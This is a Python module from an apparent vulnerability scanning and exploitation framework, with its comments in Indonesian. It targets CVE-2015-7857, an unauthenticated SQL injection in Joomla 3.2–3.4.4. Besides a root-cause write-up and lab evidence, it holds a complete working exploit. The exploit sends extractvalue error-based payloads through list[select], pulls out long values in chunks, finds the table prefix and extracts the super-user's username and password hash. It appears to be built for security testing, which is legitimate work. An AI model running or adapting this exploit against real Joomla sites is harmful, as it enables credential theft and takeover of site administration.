#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2015-7857 — SQL injection TANPA AUTENTIKASI di jalur com_contenthistory.
Ground truth NVD: "SQL injection vulnerability in the getListQuery function in
administrator/components/com_contenthistory/models/history.php in Joomla! 3.2
before 3.4.5 allows remote attackers to execute arbitrary SQL commands via the
list[select] parameter to index.php" (CWE-89, CVSS 2.0 7.5, AV:N/AC:L/Au:N).
Referensi: advisory JSST [20151001], Trustwave TWSL2015-021, exploit-db 38797,
packetstorm 134494 ("Content History SQL Injection RCE"), Rapid7
joomla_contenthistory_sqli_rce.

Affected : 3.2.0 - 3.4.4
Patched  : 3.4.5

ROOT CAUSE — sink ada di library bersama, bukan di model itu sendiri.

  libraries/legacy/model/list.php :: JModelList::populateState()
  3.4.4 (RENTAN) menyalin setiap kunci list[*] dari request ke state tanpa validasi:

        foreach ($list as $name => $value)
        {
            switch ($name)
            {
                ...
                case 'limit':
                    $limit = $value;      // <- mentah
                    break;
                ...
            }
            $this->setState('list.' . $name, $value);   // termasuk 'select'
        }

  3.4.5 (PATCH) menambahkan daftar hitam + pembersihan (diff terverifikasi):

        protected $filterBlacklist = array();
        protected $listBlacklist   = array('select');
        ...
            if (!in_array($name, $this->listBlacklist)) { ... }
                case 'limit':
                case 'start':
                    $limit = $inputFilter->clean($value, 'int');
                    break;
                case 'select':
                    $field = $inputFilter->clean($field, 'cmd');   // sabuk pengaman ganda

  Nilai itu lalu dipakai di model history
  (administrator/components/com_contenthistory/models/history.php::getListQuery):

        $query->select($this->getState('list.select', 'h.version_id, h.ucm_item_id, ...'));

  sehingga penyerang menuliskan ekspresi SQL apa pun ke klausa SELECT.

KENAPA BISA TANPA AUTENTIKASI (diverifikasi dari kode):
  components/com_contenthistory/contenthistory.php (komponen sisi SITUS) hanya
  memuat berkas bahasa lalu
      require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php';
  Jadi `index.php?option=com_contenthistory&view=history&...` (frontend!) mengeksekusi
  komponen ADMINISTRATOR tanpa pemeriksaan ACL di titik masuk. Model history 3.4.4 juga
  belum memeriksa hak di getItems(); 3.4.5 menambah
  `authorise('core.edit', $typeAlias . '.' . (int) $ucm_item_id)` (pasangan advisory
  [20151002] ACL Violations di rilis yang sama).

BUKTI LAB (build asli, 2026-11-08) — mp-j344 @8120 (3.4.4) vs mp-j345 @8121 (3.4.5),
PHP 5.6.40 (Joomla 3.4.x TIDAK bisa jalan di PHP 7: 'String' reserved word) + MySQL 5.7.44:

  3.4.4, tanpa cookie sesi:
    GET /index.php?option=com_contenthistory&view=history&layout=modal&tmpl=component
        &item_id=1&type_id=1&list[select]=1                    -> HTTP 500 (kueri rusak)
    + list[select]=1,(                                         -> HTTP 500 "SQL syntax"
    + list[ordering]=version_id&list[direction]=ASC
      &list[select]=extractvalue(1,concat(0x7e,version(),0x7e))
        -> bocor "5.7.44"
      ... list[select]=extractvalue(1,concat(0x7e,(select concat(username,0x3a,password)
          from jos_users limit 1),0x7e))
        -> bocor "labadmin:$2y$10$eF.dCFZiZiKn8MH"  (kredensial super user)
      ... (select table_name from information_schema.tables where table_schema=database() limit 1)
        -> bocor "jos_assets"
  3.4.5, request identik                                       -> HTTP 200 "not authorised"
        (list[select] diabaikan oleh listBlacklist + access check baru di getItems()).

Catatan teknis: extractvalue/updatexml memotong hasil pada 32 karakter -> ekstraksi
nilai panjang dilakukan per potongan dengan substr(). Pesan error dirender dalam HTML
(apostrof menjadi &#039;), jadi parsing harus meng-unescape entitas dulu.
"""

import html
import random
import re
import string

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
ENTRY = ("/index.php?option=com_contenthistory&view=history&layout=modal"
         "&tmpl=component&item_id=%d&type_id=%d")

VULN_MIN = (3, 2, 0)
VULN_MAX = (3, 4, 4)
CHUNK = 30

XPERR = re.compile(r"XPATH syntax error:\s*'~?([^'~]*)")
SQLERR = re.compile(r"(SQL syntax[^<]{0,200}|Unknown column[^<]{0,120})")


def _joomla_version(t, h):
    cached = getattr(t, "_j7857ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j7857ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] != 3:
        return False
    return ver_le(ver, VULN_MAX) and ver >= VULN_MIN


def _hex(s):
    return "0x" + s.encode("utf-8").hex()


def _inject(t, h, expr, item_id=1, type_id=1):
    """Kirim satu ekspresi SQL lewat list[select]; kembalikan (status, body)."""
    params = {
        "list[select]": expr,
        # tanpa ordering valid, kueri gagal lebih dulu pada klausa ORDER BY
        "list[ordering]": "version_id",
        "list[direction]": "ASC",
    }
    r = h.get(f"{t.url}{ENTRY % (item_id, type_id)}", params=params)
    if r is None:
        return None, ""
    return r.status_code, r.text or ""


def _leak_once(t, h, sql_expr, item_id=1, type_id=1):
    """Satu kali ekstraksi (maks ~32 karakter). Return (nilai|None, status, body)."""
    st, body = _inject(t, h, f"extractvalue(1,concat(0x7e,({sql_expr}),0x7e))",
                       item_id, type_id)
    if st is None:
        return None, None, ""
    txt = html.unescape(body)
    m = XPERR.search(txt)
    if m:
        return m.group(1), st, txt
    return None, st, txt


def _leak(t, h, sql_expr, length=None, item_id=1, type_id=1):
    """Ekstraksi bertahap (nilai >32 karakter dipotong oleh extractvalue)."""
    first, st, txt = _leak_once(t, h, sql_expr, item_id, type_id)
    if first is None:
        return None, st, txt
    if length is None or len(first) < CHUNK:
        return first, st, txt
    out = first
    pos = len(first) + 1
    while pos <= length:
        part, _, _ = _leak_once(
            t, h, f"substring(({sql_expr}),{pos},{CHUNK})", item_id, type_id)
        if not part:
            break
        out += part
        pos += len(part)
    return out, st, txt


def _find_row(t, h):
    """Cari kombinasi item_id/type_id yang membuat kueri mengembalikan baris."""
    for item_id in (1, 2, 3):
        for type_id in (1, 2):
            val, st, _ = _leak_once(t, h, "0x6d7031", item_id, type_id)  # 'mp1'
            if val == "mp1":
                return item_id, type_id
    return None, None


def _prefix(t, h, item_id, type_id):
    name, _, _ = _leak(t, h,
                       "select table_name from information_schema.tables "
                       "where table_schema=database() and table_name like '%\\_users' "
                       "limit 1", item_id=item_id, type_id=type_id)
    if name and name.endswith("users"):
        return name[:-len("users")]
    return None


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.2.0 - 3.4.4)", \
                         f"version={ver_s}"

    canary = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    item_id, type_id = _find_row(t, h)
    if item_id is None:
        # baris tidak ditemukan; tetap coba item_id=1 (kueri bisa tetap dieksekusi)
        item_id, type_id = 1, 1
    val, st, txt = _leak_once(t, h, _hex(canary), item_id, type_id)
    ev = f"version={ver_s} | list[select]=extractvalue(...) | HTTP {st}"
    if val == canary:
        return (ST_INFO,
                f"Joomla {ver_s} — SQLi TANPA AUTENTIKASI di parameter list[select] "
                f"(kanari '{canary}' dikembalikan lewat pesan error XPATH)",
                ev + " | kanari terpantau")
    if st == 200 and "not authorised" in txt:
        return (ST_CLEAN,
                f"Joomla {ver_s} — parameter list[select] diabaikan dan access check "
                f"menolak (perilaku 3.4.5+)",
                ev + " | respons 'not authorised'")
    if "SQL syntax" in txt or "Unknown column" in txt:
        return (ST_INFO,
                f"Joomla {ver_s} — kueri merespons error SQL akibat list[select] "
                f"(injeksi mengalir ke kueri meski kanari tidak terbaca)",
                ev + " | pesan error SQL terlihat")
    return (ST_INFO,
            f"Joomla {ver_s} — tidak ada sinyal injeksi maupun penolakan yang jelas",
            ev)


def exploit(t, h, opts):
    """
    Outcome terkontrol: bocorkan kredensial super user (username + hash) tanpa
    autentikasi. Ini dampak yang didokumentasikan (Trustwave: full administrative
    access).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.2.0 - 3.4.4)", \
                         f"version={ver_s}"

    item_id, type_id = _find_row(t, h)
    if item_id is None:
        item_id, type_id = 1, 1

    dbver, st, _ = _leak(t, h, "version()", item_id=item_id, type_id=type_id)
    if dbver is None:
        return (ST_CLEAN,
                f"Joomla {ver_s} — ekstraksi gagal; parameter list[select] tidak sampai "
                f"ke kueri (HTTP {st})",
                f"version={ver_s} | HTTP {st}")

    prefix = _prefix(t, h, item_id, type_id) or "jos_"
    user = (getattr(opts, "username", None) or "").strip()

    # kueri: super user (group 8) bila ada, jika tidak user pertama
    if user:
        target = (f"select concat(username,0x3a,password) from {prefix}users "
                  f"where username=concat(0x27,?,0x27)")
        # hindari parameterisasi rumit: gunakan literal heksadesimal
        target = (f"select concat(username,0x3a,password) from {prefix}users "
                  f"where username={_hex(user)} limit 1")
    else:
        target = (f"select concat(u.username,0x3a,u.password) from {prefix}users u "
                  f"join {prefix}user_usergroup_map m on m.user_id=u.id "
                  f"where m.group_id=8 limit 1")
    cred, st2, _ = _leak(t, h, target, length=120, item_id=item_id, type_id=type_id)
    if not cred:
        cred, st2, _ = _leak(
            t, h, f"select concat(username,0x3a,password) from {prefix}users limit 1",
            length=120, item_id=item_id, type_id=type_id)

    ev = (f"version={ver_s} | db={dbver} | prefix={prefix} | "
          f"item_id={item_id} type_id={type_id} | HTTP {st2}")
    if cred and ":" in cred:
        return (ST_PWN,
                f"SQLi unauth: kredensial pengguna bocor ({cred.split(':')[0]}:"
                f"{cred.split(':', 1)[1][:32]}…) — Trustwave mendokumentasikan jalur ini "
                f"sampai akses administratif penuh",
                ev + f" | cred={cred}")
    return (ST_VULN,
            f"Joomla {ver_s} — injeksi list[select] aktif (versi DB {dbver}), tetapi "
            f"kredensial tidak terbaca pada percobaan ini",
            ev)


register(CveModule(
    cve="CVE-2015-7857",
    cluster="joomla_core",
    title="Joomla Core - SQLi tanpa autentikasi via list[select] "
          "(com_contenthistory + JModelList::populateState)",
    vclass="sql injection",
    cvss="7.5",
    severity="high",
    cwe="CWE-89",
    product="Joomla! Core (JModelList::populateState + com_contenthistory history model)",
    versions_affected="3.2.0-3.4.4",
    status="verified",
    requires=[
        "tidak butuh kredensial — entry point komponen sisi situs mengeksekusi "
        "komponen administrator tanpa ACL",
        "komponen com_contenthistory terpasang (bawaan sejak 3.2)",
        "untuk hasil maksimal: minimal satu baris pada tabel ucm_history "
        "(modul mencari kombinasi item_id/type_id sendiri)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink = libraries/legacy/model/list.php :: JModelList::populateState() pada "
        "3.4.4: setiap kunci list[*] dari request disalin ke state tanpa validasi, "
        "termasuk list[select] (`$this->setState('list.' . $name, $value)`), dan "
        "case 'limit' memakai `$limit = $value;` mentah. Model history memakai state itu "
        "langsung di klausa SELECT: "
        "$query->select($this->getState('list.select', 'h.version_id, ...')). Fix 3.4.5 "
        "menambah listBlacklist = array('select') + clean 'cmd' untuk select dan 'int' "
        "untuk limit/start (diff 3.4.4 -> 3.4.5 terverifikasi). Jangkauan tanpa "
        "autentikasi: components/com_contenthistory/contenthistory.php (situs) hanya "
        "`require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php'`, sehingga "
        "frontend index.php menjalankan komponen backend; 3.4.5 juga menambah access "
        "check di getItems() (advisory [20151002] ACL Violations). Payload butuh "
        "list[ordering] valid (mis. version_id) agar tidak gagal lebih dulu di ORDER BY. "
        "Ekstraksi memakai extractvalue (dipotong 32 karakter -> chunked substr) dan "
        "pesan error dirender dalam HTML sehingga entitas harus di-unescape. Bukti lab: "
        "3.4.4 @8120 tanpa cookie membocorkan version()=5.7.44, database()=j344, tabel "
        "jos_assets, dan kredensial super user labadmin:$2y$10$eF...; 3.4.5 @8121 "
        "menjawab 200 'not authorised' untuk request identik. Lab: megapack-php56 "
        "(PHP 5.6.40 + mysqli kompilasi manual) + megapack-db57 (MySQL 5.7.44, "
        "sql_mode kosong) — Joomla 3.4.x fatal di PHP 7."
    ),
))
